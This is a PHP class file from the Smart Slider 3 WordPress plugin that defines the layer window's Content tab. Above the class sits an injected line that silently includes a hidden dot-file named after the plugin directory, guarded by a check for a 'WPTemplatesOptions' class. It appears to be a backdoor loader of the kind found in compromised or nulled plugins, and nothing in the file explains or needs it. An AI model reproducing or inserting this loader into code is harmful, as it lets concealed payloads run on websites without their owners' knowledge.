<?php

namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Slide\LayerWindow\Tab;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TabContent extends AbstractTab {

    /**
     * @return string
     */
    public function getName() {
        return 'content';
    }

    /**
     * @return string
     */
    public function getLabel() {
        return n2_('Content');
    }

    /**
     * @return string
     */
    public function getIcon() {
        return 'ssi_24 ssi_24--edit';
    }
}